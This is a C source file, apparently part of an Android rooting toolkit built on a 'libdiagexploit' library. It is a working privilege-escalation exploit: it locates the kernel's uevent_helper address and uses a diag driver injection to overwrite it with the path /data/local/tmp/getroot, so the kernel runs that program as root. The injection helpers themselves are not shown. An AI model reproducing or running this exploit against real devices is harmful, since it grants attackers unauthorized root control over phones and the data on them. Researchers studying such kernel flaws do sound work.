/*
 * Copyright (C) 2013 Hiroyuki Ikezoe
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *
 */
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <stdbool.h>

#include "libdiagexploit/diag.h"
#include "common.h"

static bool
inject_getroot_command(unsigned int uevent_helper_address,
                       const char *helper_command_path)
{
  struct diag_values data[400];
  int data_length;

  data_length = prepare_injection_data(data, sizeof(data),
                                       uevent_helper_address,
                                       helper_command_path);

  return diag_inject(data, data_length) == 0;
}

static void
usage()
{
  printf("Usage:\n");
  printf("\tdiaggetroot [uevent_helper address]\n");
}

int
main(int argc, char **argv)
{
  unsigned int uevent_helper_address;
  bool success;

  if (argc >= 2) {
    uevent_helper_address = strtoul(argv[1], NULL, 16);
  }

  if (!uevent_helper_address) {
    uevent_helper_address = get_uevent_helper_address();
    if (!uevent_helper_address) {
      usage();
      exit(EXIT_FAILURE);
    }
  }

  success = inject_getroot_command(uevent_helper_address,
                                   "/data/local/tmp/getroot");
  if (!success) {
    exit(EXIT_FAILURE);
  }

  exit(EXIT_SUCCESS);
}
/*
vi:ts=2:nowrap:ai:expandtab:sw=2
*/
